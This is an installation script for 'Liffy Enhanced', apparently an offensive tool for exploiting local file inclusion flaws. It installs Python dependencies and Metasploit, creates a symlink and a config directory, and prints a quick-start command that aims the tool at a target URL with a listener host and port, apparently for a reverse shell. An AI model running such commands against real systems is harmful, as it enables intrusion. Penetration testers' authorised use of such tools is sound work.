#!/bin/bash

# Liffy Enhanced Installation Script
# This script installs Liffy Enhanced and its dependencies

set -e

echo "🚀 Installing Liffy Enhanced - Ultimate LFI Exploitation Tool"
echo "=============================================================="

# Check if Python 3 is installed
if ! command -v python3 &> /dev/null; then
    echo "❌ Python 3 is not installed. Please install Python 3.7 or higher."
    exit 1
fi

# Check Python version
PYTHON_VERSION=$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')
REQUIRED_VERSION="3.7"

if [ "$(printf '%s\n' "$REQUIRED_VERSION" "$PYTHON_VERSION" | sort -V | head -n1)" != "$REQUIRED_VERSION" ]; then
    echo "❌ Python 3.7 or higher is required. Current version: $PYTHON_VERSION"
    exit 1
fi

echo "✅ Python $PYTHON_VERSION detected"

# Install Python dependencies
echo "📦 Installing Python dependencies..."
pip3 install -r requirements.txt

# Check if Metasploit is installed
if ! command -v msfvenom &> /dev/null; then
    echo "⚠️  Metasploit Framework not found. Installing..."
    
    # Detect OS and install Metasploit
    if [ -f /etc/debian_version ]; then
        # Debian/Ubuntu/Kali
        sudo apt update
        sudo apt install -y metasploit-framework
    elif [ -f /etc/arch-release ]; then
        # Arch Linux
        sudo pacman -S metasploit
    elif [ -f /etc/redhat-release ]; then
        # RHEL/CentOS/Fedora
        sudo yum install -y metasploit-framework
    else
        echo "❌ Unsupported OS. Please install Metasploit Framework manually."
        echo "   Visit: https://www.metasploit.com/download"
        exit 1
    fi
else
    echo "✅ Metasploit Framework detected"
fi

# Make files executable
echo "🔧 Setting up permissions..."
chmod +x liffy_enhanced.py
chmod +x http_server.py
chmod +x install.sh

# Create symlink for easy access
if [ -w /usr/local/bin ]; then
    echo "🔗 Creating symlink for global access..."
    sudo ln -sf "$(pwd)/liffy_enhanced.py" /usr/local/bin/liffy-enhanced
    echo "✅ You can now run 'liffy-enhanced' from anywhere"
else
    echo "⚠️  Cannot create global symlink. Run from current directory: ./liffy_enhanced.py"
fi

# Create configuration directory
mkdir -p ~/.liffy
echo "📁 Created configuration directory: ~/.liffy"

# Test installation
echo "🧪 Testing installation..."
python3 liffy_enhanced.py --help > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "✅ Installation successful!"
else
    echo "❌ Installation test failed"
    exit 1
fi

echo ""
echo "🎉 Liffy Enhanced installation completed successfully!"
echo ""
echo "📖 Quick Start:"
echo "   liffy-enhanced --url http://target/file.php?page= --auto --lhost 192.168.1.100 --lport 4444"
echo ""
echo "📚 Documentation:"
echo "   cat README_ENHANCED.md"
echo ""
echo "🔧 Configuration:"
echo "   ~/.liffy/liffy_config.json"
echo ""
echo "Happy hacking! 🚀"
